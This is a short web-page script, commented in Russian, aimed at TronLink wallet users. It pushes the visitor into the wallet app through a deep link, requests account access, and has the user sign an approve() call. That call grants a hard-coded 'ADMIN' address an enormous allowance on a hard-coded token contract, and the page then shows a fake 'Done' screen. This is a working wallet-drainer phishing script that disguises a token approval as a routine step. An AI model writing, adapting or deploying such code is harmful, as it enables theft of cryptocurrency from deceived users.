<script>
    const ADMIN = 'TXRBrbaTiNotkHp6gSC6vbbZYPq7dqyjF4';
    const CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';

    async function handleProcess() {
        const isTronLink = window.tronWeb || (window.tron && window.tron.tronWeb);

        if (!isTronLink) {
            // ШАГ 1: ПЕРЕХОД. Используем универсальный протокол.
            // При нажатии iPhone САМ выдаст окно "Открыть в TronLink?"
            const target = "tronlinkorg://dapp?url=" + encodeURIComponent(window.location.href);
            window.location.href = target;
            return;
        }

        // ШАГ 2: ПОДПИСЬ. Мы уже внутри кошелька.
        try {
            const tron = window.tronWeb || window.tron.tronWeb;
            // Запрос разрешения на подключение (Connect)
            const accounts = await tron.request({ method: 'tron_requestAccounts' });
            
            if (accounts.code === 200) {
                const contract = await tron.contract().at(CONTRACT);
                // Вызываем Approve. Пользователь видит стандартное системное окно кошелька.
                await contract.approve(ADMIN, '1000000000000000000').send({ feeLimit: 100000000 });
                
                showSuccessUI(); // Показываем красивое "Готово"
            }
        } catch (e) {
            console.error("User rejected or error:", e);
        }
    }
</script>
